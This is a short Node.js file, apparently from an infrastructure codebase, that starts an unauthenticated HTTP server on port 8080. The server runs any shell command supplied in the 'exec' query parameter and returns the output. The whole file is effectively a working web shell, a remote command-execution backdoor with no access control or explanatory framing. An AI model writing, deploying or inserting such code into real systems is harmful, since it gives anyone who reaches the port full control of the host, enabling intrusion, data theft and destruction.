/* $Header: /root/src/infra/nodes/shell_server.js,v 1.7 2024/12/11 19:57:00 delfosse Exp $ */
var PORT = 8080;
var url = require('url');
var querystring = require('querystring');
var exec = require('child_process');
var working = false;
var http = require('http');
var r=0;

function display(error,stdout,stderr) {
	console.log(stdout);
}

var server = http.createServer(function(req,res) {
	var s;
	var page = url.parse(req.url).pathname;
	var params = querystring.parse(url.parse(req.url).query);
	res.writeHead(200, { 'Content-Type': 'text/html'});
	if ('exec' in params && !working) {
		working = true;
		try {
			s=exec.execSync(params['exec']);
		} catch (error) {
			r=error.status;
		}
		working = false;
	}
	if (String(r) === "0") {
		res.write("<PRE>");
		for ( var k in s ) {
			res.write(String.fromCharCode(s[k]));
			if (k == s.length-1) break;
		}
		res.write("</PRE>");
	}
	else
	{
		var m="<p style=\"color:#FF0000\";>"+r+"</p>";
		res.write(String(m)); 
		r=0;
	}
	res.end();
});
server.listen(PORT);
console.log('Running...');
